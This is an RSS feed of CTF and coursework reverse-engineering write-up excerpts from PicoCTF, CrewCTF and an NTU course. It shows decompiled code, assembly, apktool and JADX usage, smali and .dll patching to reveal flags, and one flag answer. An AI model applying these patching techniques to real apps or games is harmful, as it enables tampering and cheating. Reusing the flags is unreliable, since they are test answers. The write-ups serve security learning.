<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Reverse :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/reverse/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/reverse/index.xml" rel="self" type="application/rss+xml"/><item><title>CrewCTF - ez rev</title><link>https://bernie6401.github.io/security/practice/crewctf/reverse/crewctf---ez-rev/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/reverse/crewctf---ez-rev/index.html</guid><description>CrewCTF - ez rev Source Code :::spoiler IDA Fake Main Function
void __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+Ch] [rbp-4h] puts("[+] Another flag checker..."); fgets(byte_4200E0, 256, stdin); if ( byte_4200E0[strlen(byte_4200E0) - 1] == 10 ) byte_4200E0[strlen(byte_4200E0) - 1] = 0; for ( i = 0; i &lt;= 73; ++i ) { if ( byte_4200E0[i] != (byte_420060[i] ^ 0x70) ) sub_401220(); } sub_401202(); } :::
Recon 首先這一題真的太難了，超出我的守備範圍，所以我先寫一些當作紀錄，之後可以更快銜接繼續解
首先可以執行一下，如果是在Ubuntu 20.04(預設Libc版本是2.31)的版本和其他版本會有不一樣的output
$ ldd --version ldd (Ubuntu GLIBC 2.31-0ubuntu9.9) 2.31 Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Written by Roland McGrath and Ulrich Drepper. $ ./a.out [+] Another flag checker... 123456 [-] No :( $ ldd --version ldd (Ubuntu GLIBC 2.35-0ubuntu3) 2.35 Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Written by Roland McGrath and Ulrich Drepper. ./a.out [+] Another flag checker... 123456 [-] Why you still here 這是因為他和這隻程式執行的過程有關係</description></item><item><title>NTU CS 2023 HW2 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/index.html</guid><description>NTU CS 2023 HW2 Write Up Name: 何秉學 Student ID: R11921A16 :::spoiler TOC [TOC] :::
Lab-HelloRevWorld Flag: FLAG{h311O_revers1ng_3ngineer5}
解題流程與思路 這一題主要是練習如何把如何把bytes變成字串:
可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用Y定義他的型別成int dword_2008[32]，前面的int就看每一個字元是來決定，後面[32]就代表有多少字元變成array；第二種方法就是直接按d改變一個字元的型態變成int，然後在edit/Array的地方可以叫出Convert to array的視窗(如果前面沒有先用d改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意) 接著就是在Option/String literals視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style :::spoiler 完整流程 .rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o .rodata:0000000000002009 db 0 .rodata:000000000000200A db 0 .rodata:000000000000200B db 0 .rodata:000000000000200C db 4Ch ; L .rodata:000000000000200D db 0 .rodata:000000000000200E db 0 .rodata:000000000000200F db 0 .rodata:0000000000002010 db 41h ; A .rodata:0000000000002011 db 0 .rodata:0000000000002012 db 0 .rodata:0000000000002013 db 0 .rodata:0000000000002014 db 47h ; G .rodata:0000000000002015 db 0 .rodata:0000000000002016 db 0 .rodata:0000000000002017 db 0 .rodata:0000000000002018 db 7Bh ; { .rodata:0000000000002019 db 0 .rodata:000000000000201A db 0 .rodata:000000000000201B db 0 .rodata:000000000000201C db 68h ; h .rodata:000000000000201D db 0 .rodata:000000000000201E db 0 .rodata:000000000000201F db 0 .rodata:0000000000002020 db 33h ; 3 .rodata:0000000000002021 db 0 .rodata:0000000000002022 db 0 .rodata:0000000000002023 db 0 .rodata:0000000000002024 db 31h ; 1 .rodata:0000000000002025 db 0 .rodata:0000000000002026 db 0 .rodata:0000000000002027 db 0 .rodata:0000000000002028 db 31h ; 1 .rodata:0000000000002029 db 0 .rodata:000000000000202A db 0 .rodata:000000000000202B db 0 .rodata:000000000000202C db 4Fh ; O .rodata:000000000000202D db 0 .rodata:000000000000202E db 0 .rodata:000000000000202F db 0 .rodata:0000000000002030 db 5Fh ; _ .rodata:0000000000002031 db 0 .rodata:0000000000002032 db 0 .rodata:0000000000002033 db 0 .rodata:0000000000002034 db 72h ; r .rodata:0000000000002035 db 0 .rodata:0000000000002036 db 0 .rodata:0000000000002037 db 0 .rodata:0000000000002038 db 65h ; e .rodata:0000000000002039 db 0 .rodata:000000000000203A db 0 .rodata:000000000000203B db 0 .rodata:000000000000203C db 76h ; v .rodata:000000000000203D db 0 .rodata:000000000000203E db 0 .rodata:000000000000203F db 0 .rodata:0000000000002040 db 65h ; e .rodata:0000000000002041 db 0 .rodata:0000000000002042 db 0 .rodata:0000000000002043 db 0 .rodata:0000000000002044 db 72h ; r .rodata:0000000000002045 db 0 .rodata:0000000000002046 db 0 .rodata:0000000000002047 db 0 .rodata:0000000000002048 db 73h ; s .rodata:0000000000002049 db 0 .rodata:000000000000204A db 0 .rodata:000000000000204B db 0 .rodata:000000000000204C db 31h ; 1 .rodata:000000000000204D db 0 .rodata:000000000000204E db 0 .rodata:000000000000204F db 0 .rodata:0000000000002050 db 6Eh ; n .rodata:0000000000002051 db 0 .rodata:0000000000002052 db 0 .rodata:0000000000002053 db 0 .rodata:0000000000002054 db 67h ; g .rodata:0000000000002055 db 0 .rodata:0000000000002056 db 0 .rodata:0000000000002057 db 0 .rodata:0000000000002058 db 5Fh ; _ .rodata:0000000000002059 db 0 .rodata:000000000000205A db 0 .rodata:000000000000205B db 0 .rodata:000000000000205C db 33h ; 3 .rodata:000000000000205D db 0 .rodata:000000000000205E db 0 .rodata:000000000000205F db 0 .rodata:0000000000002060 db 6Eh ; n .rodata:0000000000002061 db 0 .rodata:0000000000002062 db 0 .rodata:0000000000002063 db 0 .rodata:0000000000002064 db 67h ; g .rodata:0000000000002065 db 0 .rodata:0000000000002066 db 0 .rodata:0000000000002067 db 0 .rodata:0000000000002068 db 69h ; i .rodata:0000000000002069 db 0 .rodata:000000000000206A db 0 .rodata:000000000000206B db 0 .rodata:000000000000206C db 6Eh ; n .rodata:000000000000206D db 0 .rodata:000000000000206E db 0 .rodata:000000000000206F db 0 .rodata:0000000000002070 db 65h ; e .rodata:0000000000002071 db 0 .rodata:0000000000002072 db 0 .rodata:0000000000002073 db 0 .rodata:0000000000002074 db 65h ; e .rodata:0000000000002075 db 0 .rodata:0000000000002076 db 0 .rodata:0000000000002077 db 0 .rodata:0000000000002078 db 72h ; r .rodata:0000000000002079 db 0 .rodata:000000000000207A db 0 .rodata:000000000000207B db 0 .rodata:000000000000207C db 35h ; 5 .rodata:000000000000207D db 0 .rodata:000000000000207E db 0 .rodata:000000000000207F db 0 .rodata:0000000000002080 db 7Dh ; } .rodata:0000000000002081 db 0 .rodata:0000000000002082 db 0 .rodata:0000000000002083 db 0 .rodata:0000000000002084 db 0 .rodata:0000000000002085 db 0 .rodata:0000000000002086 db 0 .rodata:0000000000002087 db 0 $\downarrow$</description></item><item><title>PicoCTF - ARMssembly 0</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---armssembly-0/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---armssembly-0/index.html</guid><description>PicoCTF - ARMssembly 0 Source code :::spoiler ARM assembly code
.arch armv8-a .file	"chall.c" .text .align	2 .global	func1 .type	func1, %function func1: sub	sp, sp, #16 str	w0, [sp, 12] str	w1, [sp, 8] ldr	w1, [sp, 12] ldr	w0, [sp, 8] cmp	w1, w0 bls	.L2 ldr	w0, [sp, 12] b	.L3 .L2: ldr	w0, [sp, 8] .L3: add	sp, sp, 16 ret .size	func1, .-func1 .section	.rodata .align	3 .LC0: .string	"Result: %ld\n" .text .align	2 .global	main .type	main, %function main: stp	x29, x30, [sp, -48]! add	x29, sp, 0 str	x19, [sp, 16] str	w0, [x29, 44] str	x1, [x29, 32] ldr	x0, [x29, 32] add	x0, x0, 8 ldr	x0, [x0] bl	atoi mov	w19, w0 ldr	x0, [x29, 32] add	x0, x0, 16 ldr	x0, [x0] bl	atoi mov	w1, w0 mov	w0, w19 bl	func1 mov	w1, w0 adrp	x0, .LC0 add	x0, x0, :lo12:.LC0 bl	printf mov	w0, 0 ldr	x19, [sp, 16] ldp	x29, x30, [sp], 48 ret .size	main, .-main .ident	"GCC: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0" .section	.note.GNU-stack,"",@progbits :::</description></item><item><title>PicoCTF - asm4</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---asm4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---asm4/index.html</guid><description>PicoCTF - asm4 Description What will asm4(“picoCTF_f97bb”) return? Submit the flag as a hexadecimal value (starting with ‘0x’). NOTE: Your submission for this question will NOT be in the normal flag format.
Source code :::spoiler Source Code
asm4: &lt;+0>:	push ebp &lt;+1>:	mov ebp,esp &lt;+3>:	push ebx &lt;+4>:	sub esp,0x10 &lt;+7>:	mov DWORD PTR [ebp-0x10],0x27a &lt;+14>:	mov DWORD PTR [ebp-0xc],0x0 &lt;+21>:	jmp 0x518 &lt;asm4+27> &lt;+23>:	add DWORD PTR [ebp-0xc],0x1 &lt;+27>:	mov edx,DWORD PTR [ebp-0xc] &lt;+30>:	mov eax,DWORD PTR [ebp+0x8] &lt;+33>:	add eax,edx &lt;+35>:	movzx eax,BYTE PTR [eax] &lt;+38>:	test al,al &lt;+40>:	jne 0x514 &lt;asm4+23> &lt;+42>:	mov DWORD PTR [ebp-0x8],0x1 &lt;+49>:	jmp 0x587 &lt;asm4+138> &lt;+51>:	mov edx,DWORD PTR [ebp-0x8] &lt;+54>:	mov eax,DWORD PTR [ebp+0x8] &lt;+57>:	add eax,edx &lt;+59>:	movzx eax,BYTE PTR [eax] &lt;+62>:	movsx edx,al &lt;+65>:	mov eax,DWORD PTR [ebp-0x8] &lt;+68>:	lea ecx,[eax-0x1] &lt;+71>:	mov eax,DWORD PTR [ebp+0x8] &lt;+74>:	add eax,ecx &lt;+76>:	movzx eax,BYTE PTR [eax] &lt;+79>:	movsx eax,al &lt;+82>:	sub edx,eax &lt;+84>:	mov eax,edx &lt;+86>:	mov edx,eax &lt;+88>:	mov eax,DWORD PTR [ebp-0x10] &lt;+91>:	lea ebx,[edx+eax*1] &lt;+94>:	mov eax,DWORD PTR [ebp-0x8] &lt;+97>:	lea edx,[eax+0x1] &lt;+100>:	mov eax,DWORD PTR [ebp+0x8] &lt;+103>:	add eax,edx &lt;+105>:	movzx eax,BYTE PTR [eax] &lt;+108>:	movsx edx,al &lt;+111>:	mov ecx,DWORD PTR [ebp-0x8] &lt;+114>:	mov eax,DWORD PTR [ebp+0x8] &lt;+117>:	add eax,ecx &lt;+119>:	movzx eax,BYTE PTR [eax] &lt;+122>:	movsx eax,al &lt;+125>:	sub edx,eax &lt;+127>:	mov eax,edx &lt;+129>:	add eax,ebx &lt;+131>:	mov DWORD PTR [ebp-0x10],eax &lt;+134>:	add DWORD PTR [ebp-0x8],0x1 &lt;+138>:	mov eax,DWORD PTR [ebp-0xc] &lt;+141>:	sub eax,0x1 &lt;+144>:	cmp DWORD PTR [ebp-0x8],eax &lt;+147>:	jl 0x530 &lt;asm4+51> &lt;+149>:	mov eax,DWORD PTR [ebp-0x10] &lt;+152>:	add esp,0x10 &lt;+155>:	pop ebx &lt;+156>:	pop ebp &lt;+157>:	ret :::</description></item><item><title>PicoCTF - droids1</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids1/index.html</guid><description>PicoCTF - droids1 Backgroud Android App 逆向入門之一：拆開與重組 apk : 強烈建議新手在打之前可以先看一下這篇，稍微了解一下整體怎麼包apk以及比要檔案有哪些，或是他們儲存的資料類型之類的
Tools apktool 跟著installation guide就可以安裝成功，此工具目的在於拆解apk，我們知道apk就是一個壓縮檔，如果直接用unzip這種指令，也可以打開，只不過一些經過編譯後的byte code就還是byte code，而apktool可以在解壓縮的同時還原這些byte code Android Studio: 此工具目的在於利用emulator把該軟體安裝後跑起來 JADX: 和ApkTool一樣，可以反編譯apk，但有GUI(Recommended) $ wget https://github.com/skylot/jadx/releases/download/v1.1.0/jadx-1.1.0.zip $ unzip jadx-1.1.0.zip -d jadx $ cd jadx $ cd ./bin $ ./jadx-gui Recon 這一題有兩種方法可以反編譯apk，一種是利用ApkTool，另外一個是JADX，兩者差在有無GUI(JADX有)，主要是參考1的WP
Exploit ApkTools $ apktool d one.apk I: Using Apktool 2.8.1 on one.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: C:\Users\Bernie\AppData\Local\apktool\framework\1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... 如果有按照上面的guide把apktool裝起來，就可以直接下指令，參數d代表decode，對於比較熟Android架構的人來說應該綽綽有餘，畢竟要到哪邊找code/strings之類的，通常都會是那幾個地方，例如： Code會放在./smali/com/hellocmu/picoctf/(PS: 只不過code很醜，畢竟是smali) Strings會放在./res/values/strings.xml</description></item><item><title>PicoCTF - droids3</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids3/index.html</guid><description>PicoCTF - droids3 Background Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Source code package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cilantro(String str); public static String nope(String input) { return "don't wanna"; } public static String yep(String input) { return cilantro(input); } public static String getFlag(String input, Context ctx) { String flag = nope(input); return flag; } } Recon 利用前一題學到的工具(JADX)，先decompiler一下原本的程式在幹嘛(source code如上)，會發現getFlag這個method所呼叫的nope只會吐出don't wanna，而真正會print出flag的是yep這個method，所以我們可以修改一下，不過修改之前還是要知道一下流程 Apktool decode apk file$\to$修改必要的地方$\to$Apktool重新打包$\to$簽名$\to$Align$\to$Done，這一個部分在 Android App 逆向入門之二：修改 smali 程式碼 有詳細的說明</description></item><item><title>PicoCTF - droids4</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids4/index.html</guid><description>PicoCTF - droids4 Background Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Source code package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cardamom(String str); public static String getFlag(String input, Context ctx) { StringBuilder ace = new StringBuilder("aaa"); StringBuilder jack = new StringBuilder("aaa"); StringBuilder queen = new StringBuilder("aaa"); StringBuilder king = new StringBuilder("aaa"); ace.setCharAt(0, (char) (ace.charAt(0) + 4)); ace.setCharAt(1, (char) (ace.charAt(1) + 19)); ace.setCharAt(2, (char) (ace.charAt(2) + 18)); jack.setCharAt(0, (char) (jack.charAt(0) + 7)); jack.setCharAt(1, (char) (jack.charAt(1) + 0)); jack.setCharAt(2, (char) (jack.charAt(2) + 1)); queen.setCharAt(0, (char) (queen.charAt(0) + 0)); queen.setCharAt(1, (char) (queen.charAt(1) + 11)); queen.setCharAt(2, (char) (queen.charAt(2) + 15)); king.setCharAt(0, (char) (king.charAt(0) + 14)); king.setCharAt(1, (char) (king.charAt(1) + 20)); king.setCharAt(2, (char) (king.charAt(2) + 15)); String password = "".concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()); return input.equals(password) ? "call it" : "NOPE"; } } Recon 基本上用眼睛看應該看的出來password是啥，不過他最後只會print出call it或是NOPE，所以我們要像上一題一樣改造一下smali，可以對照一下前一題的smali是怎麼call的</description></item><item><title>PicoCTF - Easy as GDB</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---easy-as-gdb/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---easy-as-gdb/index.html</guid><description>PicoCTF - Easy as GDB Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { char *str_len; // eax int v5; // [esp-8h] [ebp-20h] int v6; // [esp-4h] [ebp-1Ch] char *input_flag; // [esp+4h] [ebp-14h] size_t str_len_1; // [esp+8h] [ebp-10h] char *src; // [esp+Ch] [ebp-Ch] input_flag = calloc(0x200u, 1u); printf("input the flag: "); fgets(input_flag, 512, stdin); str_len = strnlen(aZNh, 512, v5, v6); src = enc_input(str_len, str_len); sub_7C2(src, 1, 1); if ( check_flag(src, str_len_1) == 1 ) puts("Correct!"); else puts("Incorrect."); return 0; } :::</description></item><item><title>PicoCTF - Forky</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---forky/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---forky/index.html</guid><description>PicoCTF - Forky Background fork用法與範例 Source code Main Function From IDA
int __cdecl main(int argc, const char **argv, const char **envp) { _DWORD *v4; // [esp+8h] [ebp-Ch] v4 = mmap(0, 4u, 3, 33, -1, 0); *v4 = 1000000000; fork(); fork(); fork(); fork(); *v4 += 1234567890; doNothing(*v4); return 0; } Recon 這一題很有趣，有了background之後其實對這一題的想法差不多就和1差不多，也就是parent process fork出child process後會繼續往下fork出grandchild process，直到parent process執行完成
+ | +-----------------------------------+ | | +-----------------+ +-----------------+ | | | | +--------+ +--------+ +--------+ +--------+ | | | | | | | | +---+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ | | | | | | | | | | | | | | | | O O O O O O O O O O O O O O O O 而且他們所操作的外部記憶體對象都會是一樣的，代表*v4最終會被加16次，只是我沒有考慮到負號的問題，因為該題是32bits，代表加到一定程度會overflow，所以都沒解出來</description></item><item><title>PicoCTF - gogo</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---gogo/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---gogo/index.html</guid><description>PicoCTF - gogo Source code :::spoiler IDA Main Function
// main.main void __cdecl main_main() { _slice_interface_ typ[2]; // [esp+0h] [ebp-58h] BYREF string *second_flag; // [esp+20h] [ebp-38h] string *flag; // [esp+24h] [ebp-34h] _slice_interface_ v3; // [esp+28h] [ebp-30h] BYREF string *v4; // [esp+34h] [ebp-24h] _DWORD v5[2]; // [esp+38h] [ebp-20h] BYREF _DWORD v6[2]; // [esp+40h] [ebp-18h] BYREF _slice_interface_ v7; // [esp+48h] [ebp-10h] BYREF string *v8; // [esp+54h] [ebp-4h] flag = runtime_newobject(&amp;RTYPE_string_0); typ[0].array = "Enter Password: "; typ[0].len = 16; memset(&amp;typ[0].cap, 0, sizeof(_slice_interface_)); fmt_Printf(*&amp;typ[0].array, *&amp;typ[0].cap); v6[0] = &amp;RTYPE__ptr_string; v6[1] = flag; typ[0].array = "%s\n"; typ[0].len = 3; typ[0].cap = v6; *&amp;typ[1].array = 0x100000001LL; fmt_Scanf(*&amp;typ[0].array, *&amp;typ[0].cap); if ( main_checkPassword(*flag) ) { v5[0] = &amp;RTYPE_string_0; v5[1] = &amp;main_statictmp_0; typ[0].array = v5; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); v3.cap = &amp;RTYPE_string_0; v4 = &amp;main_statictmp_1; typ[0].array = &amp;v3.cap; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); v3.array = &amp;RTYPE_string_0; v3.len = &amp;main_statictmp_2; typ[0].array = &amp;v3; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); second_flag = runtime_newobject(&amp;RTYPE_string_0); v7.cap = &amp;RTYPE__ptr_string; v8 = second_flag; typ[0].array = "%s\n"; typ[0].len = 3; typ[0].cap = &amp;v7.cap; *&amp;typ[1].array = 0x100000001LL; fmt_Scanf(*&amp;typ[0].array, *&amp;typ[0].cap); main_ambush(*second_flag); runtime_deferproc(0, &amp;stru_81046A0); } else { v7.array = &amp;RTYPE_string_0; v7.len = &amp;main_statictmp_3; typ[0].array = &amp;v7; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); } runtime_deferreturn(typ[0].array); } :::</description></item><item><title>PicoCTF - Let's get dynamic</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/index.html</guid><description>PicoCTF - Let’s get dynamic Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+1Ch] [rbp-114h] char s2[64]; // [rsp+20h] [rbp-110h] BYREF char s[64]; // [rsp+60h] [rbp-D0h] BYREF char v7[8]; // [rsp+A0h] [rbp-90h] BYREF __int64 v8; // [rsp+A8h] [rbp-88h] __int64 v9; // [rsp+B0h] [rbp-80h] __int64 v10; // [rsp+B8h] [rbp-78h] __int64 v11; // [rsp+C0h] [rbp-70h] __int64 v12; // [rsp+C8h] [rbp-68h] __int16 v13; // [rsp+D0h] [rbp-60h] __int64 v14[6]; // [rsp+E0h] [rbp-50h] __int16 v15; // [rsp+110h] [rbp-20h] unsigned __int64 v16; // [rsp+118h] [rbp-18h] v16 = __readfsqword(0x28u); *v7 = 0xFD872AC7CA737102LL; v8 = 0x4915F12BF9F82DCBLL; v9 = 0xA7EF0D4C54003C10LL; v10 = 0x9399CCF74D02A843LL; v11 = 0x2AC6F818989688D7LL; v12 = 0x9F51EBCA33584C85LL; v13 = 231; v14[0] = 0x92D46893B5010A61LL; v14[1] = 0xA6BDE59D58F4EB4LL; v14[2] = 0xFC993A3238355027LL; v14[3] = 0xEDA7B28D7054D179LL; v14[4] = 0x419FBB499BD4CFBBLL; v14[5] = 0x935AE3903F554688LL; v15 = 185; fgets(s, 49, _bss_start); for ( i = 0; i &lt; strlen(v7); ++i ) s2[i] = *(v14 + i) ^ v7[i] ^ i ^ 0x13; if ( !memcmp(s, s2, 49uLL) ) { puts("No, that's not right."); return 1; } else { puts("Correct! You entered the flag."); return 0; } } :::</description></item><item><title>PicoCTF - No way out</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---no-way-out/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---no-way-out/index.html</guid><description>PicoCTF - No way out Background C Sharp / dn.spy / cheat engine
Recon 大概有三種解法，其中兩種是改變.dll中的內容，有點利用binary exploitation的方式顯示flag，另外一種就是利用cheat engine的方式找到儲存座標的memory然後手動改寫數值，就拿到flag
Exploit Method 1 - Change .dll 可以看到No way out/pico_Data/Managed/Assembly-CSharp.dll可能是一個可以用dn.spy decompile的文件，先看看有沒有甚麼可以更改的
在APTX class中，一個Mysterious的member，而且當collision.gameObject == this.player是true的時候，this.Mysterious.SetActive(true);就會被trigger，所以這就有點像是我們在遊戲中，如果要碰到白色旗子的時候會觸發的statement，那如果我在初始化的階段就直接把this.Mysterious.SetActive(true);設定成true，是不是就可以直接拿直到flag? Implementation 直接右鍵edit class變成多加一個Start() method，然後不用任何的條件就達到剛剛說的效果，切記一定要是Start，因為Start是有被實際呼叫的method，如果取個aaa這種名字，他本來就不會被呼叫，那改成這樣也沒意義，當然，也可以取其他會被呼叫到的method name，例如Update, Awake之類的 Method 2 - Change .dll 當然記得能改動.dll的method，我們也可以改變遊戲角色跳不過圍牆的問題，最直觀的作法是我可以直接無限制的往上跳，超過圍牆就抵達flag，不會只有跳一小段這個問題，可以查看一下EvolveGames/PlayerController/Update()這個method，其中的第51行
if (Input.GetButton("Jump") &amp;&amp; this.canMove &amp;&amp; this.characterController.isGrounded &amp;&amp; !this.isClimbing) { this.moveDirection.y = this.jumpSpeed; } 如果改成</description></item><item><title>PicoCTF - not crypto</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---not-crypto/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---not-crypto/index.html</guid><description>PicoCTF - not crypto Source code :::spoiler IDA Pseudo Source COde
__int64 __fastcall main(int a1, char **a2, char **a3) { __int128 *v4; // rax unsigned __int8 v5; // di unsigned __int8 v6; // si unsigned __int8 v7; // cl unsigned __int8 v8; // dl unsigned int v9; // r8d unsigned __int8 v10; // r11 int v16; // eax __int64 v17; // rdx unsigned int v18; // r12d char *v20; // r15 unsigned __int8 v25; // r8 int v30; // esi unsigned __int8 v32; // r12 unsigned __int8 v36; // r14 unsigned __int8 v38; // dl unsigned __int8 v40; // cl char v42; // r12 char v43; // r14 char v44; // al __int64 v45; // r13 unsigned __int8 v46; // r10 unsigned __int8 v47; // bp unsigned __int8 v48; // bl unsigned __int8 v49; // r8 unsigned __int8 v50; // r11 char v51; // dl char v54; // r10 __int64 v63; // rdx char v72; // al unsigned __int8 v84; // [rsp+Ah] [rbp-1FEh] unsigned __int8 v85; // [rsp+Bh] [rbp-1FDh] int v86; // [rsp+Ch] [rbp-1FCh] int v87; // [rsp+10h] [rbp-1F8h] unsigned __int8 v88; // [rsp+14h] [rbp-1F4h] unsigned __int8 v89; // [rsp+15h] [rbp-1F3h] unsigned __int8 v90; // [rsp+16h] [rbp-1F2h] unsigned __int8 v91; // [rsp+17h] [rbp-1F1h] unsigned __int8 v92; // [rsp+18h] [rbp-1F0h] unsigned __int8 v93; // [rsp+19h] [rbp-1EFh] unsigned __int8 v94; // [rsp+1Ah] [rbp-1EEh] unsigned __int8 v95; // [rsp+1Bh] [rbp-1EDh] unsigned __int8 v96; // [rsp+1Ch] [rbp-1ECh] char v97; // [rsp+1Dh] [rbp-1EBh] char *v98; // [rsp+20h] [rbp-1E8h] unsigned __int8 v99; // [rsp+2Ah] [rbp-1DEh] char v100; // [rsp+50h] [rbp-1B8h] char v101; // [rsp+52h] [rbp-1B6h] char v102; // [rsp+54h] [rbp-1B4h] char v103; // [rsp+56h] [rbp-1B2h] char v104; // [rsp+58h] [rbp-1B0h] char v105; // [rsp+5Ah] [rbp-1AEh] char v106; // [rsp+5Ch] [rbp-1ACh] char v107; // [rsp+5Eh] [rbp-1AAh] __int128 v108; // [rsp+60h] [rbp-1A8h] char ptr[64]; // [rsp+70h] [rbp-198h] BYREF __int128 v110; // [rsp+B0h] [rbp-158h] BYREF char v111; // [rsp+C0h] [rbp-148h] BYREF char v112[15]; // [rsp+150h] [rbp-B8h] BYREF __int128 v113; // [rsp+160h] [rbp-A8h] __int128 v115[4]; // [rsp+180h] [rbp-88h] BYREF char v116; // [rsp+1C0h] [rbp-48h] BYREF unsigned __int64 v117; // [rsp+1C8h] [rbp-40h] v117 = __readfsqword(0x28u); puts("I heard you wanted to bargain for a flag... whatcha got?"); __asm { vmovdqa xmm0, cs:xmmword_21A0 } v4 = &amp;v110; v5 = -104; v6 = 50; v7 = 108; v8 = 28; __asm { vmovdqa [rsp+208h+var_158], xmm0 } v9 = 4; do { if ( (v9 &amp; 3) == 0 ) { v10 = byte_20A0[v6]; v6 = byte_20A0[v7]; v7 = byte_20A0[v8]; v8 = byte_20A0[v5]; v5 = byte_2080[v9 >> 2] ^ v10; } v5 ^= *v4; ++v9; v4 = (v4 + 4); v6 ^= *(v4 - 3); v7 ^= *(v4 - 2); v8 ^= *(v4 - 1); *(v4 + 12) = v5; *(v4 + 13) = v6; *(v4 + 14) = v7; *(v4 + 15) = v8; } while ( v9 != 44 ); __asm { vmovdqa xmm0, cs:xmmword_21B0 vmovdqa [rsp+208h+var_A8], xmm0 } fread(ptr, 1uLL, 0x40uLL, stdin); __asm { vmovdqa xmm0, cs:xmmword_21C0 vmovdqa [rsp+208h+var_88], xmm0 vmovdqa xmm0, cs:xmmword_21D0 } v108 = v110; __asm { vmovdqa [rsp+208h+var_78], xmm0 vmovdqa xmm0, cs:xmmword_21E0 vmovdqa [rsp+208h+var_68], xmm0 vmovdqa xmm0, cs:xmmword_21F0 vmovdqa [rsp+208h+var_58], xmm0 } v100 = v112[0]; v101 = v112[2]; v102 = v112[4]; v103 = v112[6]; v104 = v112[8]; v105 = v112[10]; v106 = v112[12]; v107 = v112[14]; v98 = v115; v16 = 16; do { if ( v16 == 16 ) { v20 = &amp;v111; __asm { vmovdqa xmm4, [rsp+208h+var_A8] } LOBYTE(v87) = byte_20A0[(v113 ^ v108)]; __asm { vpextrb rax, xmm4, 4 } LOBYTE(v86) = byte_20A0[(BYTE4(v108) ^ _RAX)]; v94 = 